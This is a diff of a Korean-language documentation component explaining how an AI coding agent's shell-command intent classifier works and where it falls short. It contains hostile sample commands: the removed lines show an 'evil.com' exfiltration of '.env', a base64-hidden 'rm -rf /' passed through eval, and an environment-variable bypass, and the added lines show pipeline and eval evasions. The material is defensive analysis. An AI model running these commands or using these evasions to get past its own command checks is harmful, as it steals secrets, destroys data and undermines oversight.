@@ -1,212 +1,83 @@
-import IntentCategoriesViz from './viz/IntentCategoriesViz';
+import { CodeViewButton } from '@/components/code';
+import type { CodeRef } from '@/components/code/types';
+import { codeRefs } from './codeRefs';
 import DestructiveLevelViz from './viz/DestructiveLevelViz';
+import IntentCategoriesViz from './viz/IntentCategoriesViz';
 
-export default function CommandIntentSection() {
+export default function CommandIntentSection({ onCodeRef }: { onCodeRef: (key: string, ref: CodeRef) => void }) {
   return (
     <section id="command-intent" className="mb-16 scroll-mt-20">
-      <h2 className="text-2xl font-bold mb-6">CommandIntent 분류 &amp; 파괴적 명령어 탐지</h2>
+      <h2 className="mb-6 text-2xl font-bold">CommandIntent는 행동의 근사치다</h2>
       <div className="prose prose-neutral dark:prose-invert max-w-none">
-
-        <IntentCategoriesViz />
-
-        <h3 className="text-xl font-semibold mt-6 mb-3">CommandIntent enum 8종</h3>
         <p>
-          <strong>8개 카테고리 설계</strong> (상단 Viz 참조): 파일 시스템, 네트워크, 실행, 패키지, 시스템 5축 × 읽기/쓰기/파괴 3축<br />
-          Execute와 Package 분리 이유: 패키지 관리자는 네트워크+쓰기+실행 모두 하는 <strong>복합 연산</strong>
+          intent 분류기는 command 전체를 실행해 보지 않고 “대체로 어떤 종류의 행동인가”라는 label을
+          붙인다. 현재 구현은 선행 환경변수 할당을 건너뛴 뒤 첫 command를 뽑고, 명령 목록과 일부
+          <code>git</code>/<code>sed</code> 특수 규칙으로 여덟 category 중 하나를 고른다.
         </p>
+        <p>
+          이 label은 prompt 문구, 요구 permission, telemetry를 고르는 데 유용하다. 그러나 parser나
+          sandbox verdict가 아니다. 특히 <code>Unknown</code>은 안전이 아니라 “이 분류기로 알 수
+          없음”을 뜻한다.
+        </p>
+      </div>
 
-        <h3 className="text-xl font-semibold mt-8 mb-3">classify() 구현</h3>
+      <IntentCategoriesViz />
+
+      <div className="prose prose-neutral dark:prose-invert max-w-none">
         <div className="not-prose my-4">
-          <div className="border border-border rounded-lg overflow-hidden">
-            <div className="bg-blue-50 dark:bg-blue-950/30 px-4 py-2 border-b border-border">
-              <p className="text-sm font-semibold"><code className="text-xs">classify(cmd)</code> — 첫 단어 basename 매칭</p>
-            </div>
-            <div className="px-4 py-3 border-b border-border text-sm text-muted-foreground">
-              <p>파이프(<code className="text-xs bg-muted px-1 py-0.5 rounded">|</code>), 세미콜론(<code className="text-xs bg-muted px-1 py-0.5 rounded">;</code>), 앰퍼샌드(<code className="text-xs bg-muted px-1 py-0.5 rounded">&</code>)를 구분자로 첫 단어 추출 → 절대 경로라면 basename만 사용</p>
-            </div>
-            <div className="grid grid-cols-1 sm:grid-cols-2 divide-y sm:divide-y-0 divide-border">
-              <div className="divide-y divide-border border-r border-border">
-                <div className="px-4 py-2.5 text-sm flex items-start gap-3">
-                  <span className="font-semibold text-green-600 dark:text-green-400 w-24 shrink-0">Read</span>
-                  <span className="font-mono text-xs text-muted-foreground">ls cat head tail less more grep find locate wc file</span>
-                </div>
-                <div className="px-4 py-2.5 text-sm flex items-start gap-3 bg-muted/30">
-                  <span className="font-semibold text-blue-600 dark:text-blue-400 w-24 shrink-0">Write</span>
-                  <span className="font-mono text-xs text-muted-foreground">mv cp mkdir touch ln chmod chown</span>
-                </div>
-                <div className="px-4 py-2.5 text-sm flex items-start gap-3">
-                  <span className="font-semibold text-red-600 dark:text-red-400 w-24 shrink-0">Destructive</span>
-                  <span className="font-mono text-xs text-muted-foreground">rm shred dd mkfs wipefs srm fdisk</span>
-                </div>
-                <div className="px-4 py-2.5 text-sm flex items-start gap-3 bg-muted/30">
-                  <span className="font-semibold text-purple-600 dark:text-purple-400 w-24 shrink-0">Network</span>
-                  <span className="font-mono text-xs text-muted-foreground">curl wget ssh scp rsync nc netcat ping telnet ftp</span>
-                </div>
-              </div>
-              <div className="divide-y divide-border">
-                <div className="px-4 py-2.5 text-sm flex items-start gap-3">
-                  <span className="font-semibold text-amber-600 dark:text-amber-400 w-24 shrink-0">Execute</span>
-                  <span className="font-mono text-xs text-muted-foreground">python python3 node ruby perl sh bash zsh fish</span>
-                </div>
-                <div className="px-4 py-2.5 text-sm flex items-start gap-3 bg-muted/30">
-                  <span className="font-semibold text-teal-600 dark:text-teal-400 w-24 shrink-0">Package</span>
-                  <span className="font-mono text-xs text-muted-foreground">apt apt-get yum dnf brew pip pip3 npm yarn cargo go</span>
-                </div>
-                <div className="px-4 py-2.5 text-sm flex items-start gap-3">
-                  <span className="font-semibold text-orange-600 dark:text-orange-400 w-24 shrink-0">System</span>
-                  <span className="font-mono text-xs text-muted-foreground">sudo su systemctl service reboot shutdown mount umount kill</span>
-                </div>
-                <div className="px-4 py-2.5 text-sm flex items-start gap-3 bg-muted/30">
-                  <span className="font-semibold text-gray-500 dark:text-gray-400 w-24 shrink-0">Unknown</span>
-                  <span className="font-mono text-xs text-muted-foreground">위 목록에 없는 모든 명령</span>
-                </div>
-              </div>
-            </div>
-          </div>
+          <CodeViewButton
+            onClick={() => onCodeRef('intent-classifier', codeRefs['intent-classifier'])}
+            label="첫 command 분류 코드 보기"
+          />
         </div>
+        <h3>첫 command만 보면 사라지는 행동</h3>
+        <div className="not-prose my-5 divide-y divide-border rounded-md border border-border">
+          {[
+            ['echo ok > config', '첫 command는 read-like처럼 보이지만 redirection이 파일을 쓴다.'],
+            ['cat list | xargs rm', '앞의 cat보다 pipeline 뒤의 rm이 실제 side effect를 만든다.'],
+            ['find . -exec sh -c …', 'find 자체는 탐색 명령이지만 option이 임의 command를 실행한다.'],
+            ['python -c "…"', 'interpreter 뒤 문자열 안의 filesystem·network 행동은 basename 목록에 없다.'],
+            ['cmd=$(curl …); eval "$cmd"', 'substitution과 eval이 실행할 행동을 runtime에 조립한다.'],
+          ].map(([command, gap]) => (
+            <div key={command} className="grid gap-2 px-4 py-3 md:grid-cols-[220px_minmax(0,1fr)]">
+              <code className="break-words whitespace-normal text-[13px] font-semibold">{command}</code>
+              <span className="text-sm leading-relaxed text-muted-foreground">{gap}</span>
+            </div>
+          ))}
+        </div>
+
+        <h3>위험도 등급이 아니라 두 갈래 결과</h3>
         <p>
-          <strong>첫 단어 + basename 매칭</strong>: <code>/usr/bin/rm</code>도 <code>rm</code>으로 정규화<br />
-          파이프·세미콜론·앰퍼샌드를 구분자로 취급 — 가장 위험한 첫 명령 기준<br />
-          약 50개 명령어를 8개 카테고리로 매핑 — 나머지는 Unknown
+          destructive helper는 정교한 risk score를 계산하지 않는다. 알려진 substring 또는 broad
+          <code>rm -rf</code>를 찾으면 Warn, 아니면 Allow다. category와 warning을 합쳐 Low에서
+          Critical까지 표시하는 것은 현재 코드보다 강한 기능을 발명하는 셈이다.
         </p>
+      </div>
 
-        <h3 className="text-xl font-semibold mt-8 mb-3">Destructive 명령 세부 검증</h3>
-        <div className="not-prose my-4">
-          <div className="border border-border rounded-lg overflow-hidden">
-            <div className="bg-red-50 dark:bg-red-950/30 px-4 py-2 border-b border-border">
-              <p className="text-sm font-semibold"><code className="text-xs">analyze_rm(cmd)</code> — rm 명령 위험도 4단계</p>
-            </div>
-            <div className="divide-y divide-border text-sm">
-              <div className="grid grid-cols-[80px_1fr] px-4 py-2.5 items-center">
-                <span className="inline-flex items-center px-2 py-0.5 rounded text-xs font-semibold bg-red-600 text-white">Critical</span>
-                <span className="text-muted-foreground"><code className="text-xs bg-muted px-1 py-0.5 rounded">-rf</code> + 경로에 <code className="text-xs bg-muted px-1 py-0.5 rounded">/</code> 또는 <code className="text-xs bg-muted px-1 py-0.5 rounded">*</code> 포함 — 디렉토리 recursive 삭제</span>
-              </div>
-              <div className="grid grid-cols-[80px_1fr] px-4 py-2.5 items-center bg-muted/30">
-                <span className="inline-flex items-center px-2 py-0.5 rounded text-xs font-semibold bg-orange-500 text-white">High</span>
-                <span className="text-muted-foreground"><code className="text-xs bg-muted px-1 py-0.5 rounded">-rf</code> / <code className="text-xs bg-muted px-1 py-0.5 rounded">-fr</code> / <code className="text-xs bg-muted px-1 py-0.5 rounded">--recursive --force</code> 포함 (경로 미포함)</span>
-              </div>
-              <div className="grid grid-cols-[80px_1fr] px-4 py-2.5 items-center">
-                <span className="inline-flex items-center px-2 py-0.5 rounded text-xs font-semibold bg-amber-400 text-black">Medium</span>
-                <span className="text-muted-foreground"><code className="text-xs bg-muted px-1 py-0.5 rounded">-r</code> / <code className="text-xs bg-muted px-1 py-0.5 rounded">-R</code> 포함 — 재귀 삭제 (force 없음)</span>
-              </div>
-              <div className="grid grid-cols-[80px_1fr] px-4 py-2.5 items-center bg-muted/30">
-                <span className="inline-flex items-center px-2 py-0.5 rounded text-xs font-semibold bg-green-500 text-white">Low</span>
-                <span className="text-muted-foreground">단일 파일 삭제 — 위 패턴 미해당</span>
-              </div>
-            </div>
-          </div>
-        </div>
-        <DestructiveLevelViz />
+      <DestructiveLevelViz />
 
-        <h3 className="text-xl font-semibold mt-8 mb-3">네트워크 명령 로깅</h3>
-        <div className="not-prose my-4">
-          <div className="border border-border rounded-lg overflow-hidden">
-            <div className="bg-purple-50 dark:bg-purple-950/30 px-4 py-2 border-b border-border">
-              <p className="text-sm font-semibold"><code className="text-xs">execute_network_cmd()</code> — 네트워크 명령 감사 흐름</p>
-            </div>
-            <div className="divide-y divide-border text-sm">
-              <div className="px-4 py-3">
-                <p className="font-semibold text-purple-700 dark:text-purple-400 mb-1">URL 추출</p>
-                <p className="text-muted-foreground">정규식 <code className="text-xs bg-muted px-1 py-0.5 rounded">https?://[^\s]+</code>로 명령 내 모든 URL 수집</p>
-              </div>
-              <div className="px-4 py-3 bg-muted/30">
-                <p className="font-semibold text-purple-700 dark:text-purple-400 mb-1">감사 로그 기록</p>
-                <p className="text-muted-foreground"><code className="text-xs bg-muted px-1 py-0.5 rounded">AuditNetwork</code> 구조체: command + urls + timestamp → <code className="text-xs bg-muted px-1 py-0.5 rounded">audit_log.record_network()</code></p>
-              </div>
-              <div className="px-4 py-3">
-                <p className="font-semibold text-purple-700 dark:text-purple-400 mb-1">명령 실행</p>
-                <p className="text-muted-foreground"><code className="text-xs bg-muted px-1 py-0.5 rounded">self.run_command(cmd)</code> — 로깅 후 정상 실행</p>
-              </div>
-            </div>
-          </div>
-        </div>
+      <div className="prose prose-neutral dark:prose-invert max-w-none">
+        <h3>더 깊은 parser를 붙이면 무엇이 달라지는가</h3>
         <p>
-          <strong>URL 추출 + 감사 로그</strong>: 어떤 외부 주소와 통신했는지 기록<br />
-          보안팀이 로그 분석으로 <strong>데이터 유출 탐지</strong> 가능<br />
-          <code>curl http://evil.com/steal?data=$(cat .env)</code> 같은 공격 시도 포착
+          shell AST는 pipeline의 각 command, redirection 대상, subshell, heredoc, command
+          substitution을 구조로 드러낸다. 그래도 완전한 안전 판정은 불가능하다. 외부 script와
+          interpreter가 runtime 행동을 다시 만들기 때문이다. 목표는 “완벽한 정적 판정”이 아니라
+          <strong>더 정확한 승인 설명 + 최소권한 sandbox + 실행 후 trace</strong>다.
         </p>
-
-        <h3 className="text-xl font-semibold mt-8 mb-3">패턴 매칭의 한계 — 오탐/미탐</h3>
-        <div className="not-prose grid gap-3 my-4">
-          <div className="bg-green-50 dark:bg-green-950/30 border border-green-200 dark:border-green-800 rounded-lg p-4">
-            <p className="text-sm font-semibold text-green-700 dark:text-green-400 mb-2">오탐 (안전한데 위험으로 분류될 수 있음)</p>
-            <p className="text-sm mb-1"><code className="text-xs bg-green-100 dark:bg-green-900/50 px-1.5 py-0.5 rounded">bash("echo 'rm -rf /backup' &gt;&gt; README.md")</code></p>
-            <p className="text-sm text-green-600 dark:text-green-400">첫 단어: <code className="text-xs bg-muted px-1 py-0.5 rounded">echo</code> → Read 분류 → 정상 실행</p>
+        <div className="not-prose my-5 grid gap-3 sm:grid-cols-2">
+          <div className="rounded-md border border-border p-4">
+            <p className="m-0 text-sm font-semibold">분류 확신이 높을 때</p>
+            <p className="mb-0 mt-2 text-sm leading-relaxed text-muted-foreground">
+              좁은 prompt와 필요한 resource만 연다. 예: read-only filesystem, network off.
+            </p>
           </div>
-          <div className="bg-red-50 dark:bg-red-950/30 border border-red-200 dark:border-red-800 rounded-lg p-4">
-            <p className="text-sm font-semibold text-red-700 dark:text-red-400 mb-2">미탐 — base64 우회</p>
-            <p className="text-sm mb-1"><code className="text-xs bg-red-100 dark:bg-red-900/50 px-1.5 py-0.5 rounded">bash("eval \"$(echo cm0gLXJmIC8= | base64 -d)\"")</code></p>
-            <p className="text-sm text-red-600 dark:text-red-400">첫 단어: <code className="text-xs bg-muted px-1 py-0.5 rounded">eval</code> → Execute 분류 (Prompt만) → 숨겨진 <code className="text-xs bg-muted px-1 py-0.5 rounded">rm -rf /</code> 실행</p>
-          </div>
-          <div className="bg-red-50 dark:bg-red-950/30 border border-red-200 dark:border-red-800 rounded-lg p-4">
-            <p className="text-sm font-semibold text-red-700 dark:text-red-400 mb-2">미탐 — 환경 변수 우회</p>
-            <p className="text-sm mb-1"><code className="text-xs bg-red-100 dark:bg-red-900/50 px-1.5 py-0.5 rounded">bash("$DANGEROUS_CMD")</code></p>
-            <p className="text-sm text-red-600 dark:text-red-400">첫 단어: <code className="text-xs bg-muted px-1 py-0.5 rounded">$DANGEROUS_CMD</code> → Unknown → 검증 우회</p>
+          <div className="rounded-md border border-border p-4">
+            <p className="m-0 text-sm font-semibold">복합 syntax 또는 Unknown일 때</p>
+            <p className="mb-0 mt-2 text-sm leading-relaxed text-muted-foreground">
+              더 강한 sandbox나 명시적 Ask로 올리고, sandbox가 없으면 fail-closed한다.
+            </p>
           </div>
         </div>
-        <p>
-          <strong>근본 한계</strong>: 문자열 패턴만으로는 완벽한 분류 불가<br />
-          공격자는 base64, eval, 환경 변수 등으로 우회 가능<br />
-          <strong>claw-code의 대응</strong>: 샌드박스(bubblewrap)로 실행 자체를 격리 — 우회 성공해도 피해 제한
-        </p>
-
-        <h3 className="text-xl font-semibold mt-8 mb-3">분류 정확도 측정</h3>
-        <div className="not-prose my-4">
-          <div className="border border-border rounded-lg overflow-hidden">
-            <div className="bg-indigo-50 dark:bg-indigo-950/30 px-4 py-2 border-b border-border">
-              <p className="text-sm font-semibold">분류 정확도 테스트 — <code className="text-xs">tests/intent_classify.rs</code></p>
-            </div>
-            <div className="px-4 py-3 text-sm border-b border-border">
-              <p className="text-muted-foreground mb-2">200개 테스트 케이스로 회귀 방지</p>
-              <div className="grid grid-cols-2 gap-2">
-                <div className="bg-muted/50 rounded px-3 py-2">
-                  <span className="font-mono text-xs text-green-600 dark:text-green-400">"ls -la"</span>
-                  <span className="text-xs text-muted-foreground ml-2">→ Read</span>
-                </div>
-                <div className="bg-muted/50 rounded px-3 py-2">
-                  <span className="font-mono text-xs text-green-600 dark:text-green-400">"cat file.txt"</span>
-                  <span className="text-xs text-muted-foreground ml-2">→ Read</span>
-                </div>
-                <div className="bg-muted/50 rounded px-3 py-2">
-                  <span className="font-mono text-xs text-red-600 dark:text-red-400">"rm -rf old/"</span>
-                  <span className="text-xs text-muted-foreground ml-2">→ Destructive</span>
-                </div>
-                <div className="bg-muted/50 rounded px-3 py-2">
-                  <span className="font-mono text-xs text-purple-600 dark:text-purple-400">"curl https://..."</span>
-                  <span className="text-xs text-muted-foreground ml-2">→ Network</span>
-                </div>
-              </div>
-            </div>
-            <div className="px-4 py-3 text-sm">
-              <p className="text-muted-foreground">정확도 기준: <code className="text-xs bg-muted px-1 py-0.5 rounded">assert!(accuracy &gt; 0.95)</code> — 95% 미만이면 테스트 실패</p>
-            </div>
-          </div>
-        </div>
-        <p>
-          <strong>정확도 목표</strong>: 95% 이상 — 200개 테스트 케이스로 회귀 방지<br />
-          5% 오분류는 허용 — 대부분 Unknown으로 떨어져 보수적 처리<br />
-          새 명령어 추가 시 테스트 케이스도 함께 추가 — 정확도 유지
-        </p>
-
-        <div className="bg-amber-50 dark:bg-amber-950/30 border-l-4 border-amber-400 p-4 my-6 rounded-r-lg">
-          <p className="font-semibold mb-2">인사이트: 정적 분석 vs 런타임 샌드박스</p>
-          <p>
-            <strong>정적 분석(CommandIntent)</strong>:<br />
-            - 장점: 빠름, 로그 가능, LLM에게 에러 피드백 가능<br />
-            - 단점: 우회 가능 (eval, base64, 환경 변수)
-          </p>
-          <p className="mt-2">
-            <strong>런타임 샌드박스(bubblewrap)</strong>:<br />
-            - 장점: 우회 불가 — kernel 레벨 격리<br />
-            - 단점: 느림 (컨테이너 시작 오버헤드), Linux 전용
-          </p>
-          <p className="mt-2">
-            claw-code는 <strong>두 층 모두 사용</strong> — 정적 분석으로 90% 케이스 커버, 샌드박스로 나머지 10% 방어<br />
-            정적 분석 실패해도 샌드박스가 있고, 샌드박스 불가 환경(macOS 등)에서도 정적 분석이 작동<br />
-            "Defense in depth" — 한 층이 뚫려도 다른 층이 방어
-          </p>
-        </div>
-
       </div>
     </section>
   );
